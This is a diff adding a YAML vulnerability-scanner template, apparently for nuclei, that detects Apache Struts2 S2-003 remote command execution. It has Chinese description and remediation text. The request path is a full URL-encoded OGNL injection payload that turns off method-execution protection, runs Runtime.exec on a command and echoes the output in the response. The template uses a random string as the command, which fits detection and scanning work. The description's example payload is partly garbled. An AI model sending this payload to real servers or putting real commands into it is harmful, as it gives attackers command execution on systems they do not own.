@@ -1,0 +1,44 @@
+id: S2-003
+info:
+  name: Apache Struts2 S2-003 RCE
+  author:
+  - 折跃
+  description: |-
+    Struts2 S2-003 远程命令执行
+    OGNL还提供了广泛的表达式评估功能（http://www.ognl.org/2.6.9/Documentation/html/LanguageGuide/expressionEvaluation.html）。该漏洞允许恶意用户绕过ParametersInterceptor内置的“＃”使用保护，从而能够操纵服务器端上下文对象。
+    所以，例如，要将＃session.user设置为'0wn3d'，可以使用以下参数名称：
+    （'\ u0023'+'session 'user ' '）（未使用）= 0wn3d
+    网址编码后会显示如下：
+    （'\ u0023'％20％2b％20'session 'user \ '））（未使用）= 0wn3d
+  severity: critical
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+
+    #### 临时修复方案
+    在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,verify)
+    - '!contains(body,"xwork.MethodAccessor.denyMethodExecution")'
+  path:
+  - '{{BaseURL}}{{tmpPath}}?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27{{verify}}%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29'
+  attack: clusterbomb
+  method: GET
+  payloads:
+    tmpPath:
+    - /
+    - /index.action
+    - /login.action
+    - /default.action
+    - /admin.action
+    - /user.action
+  redirects: true
+  req-condition: true
+  stop-at-first-match: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
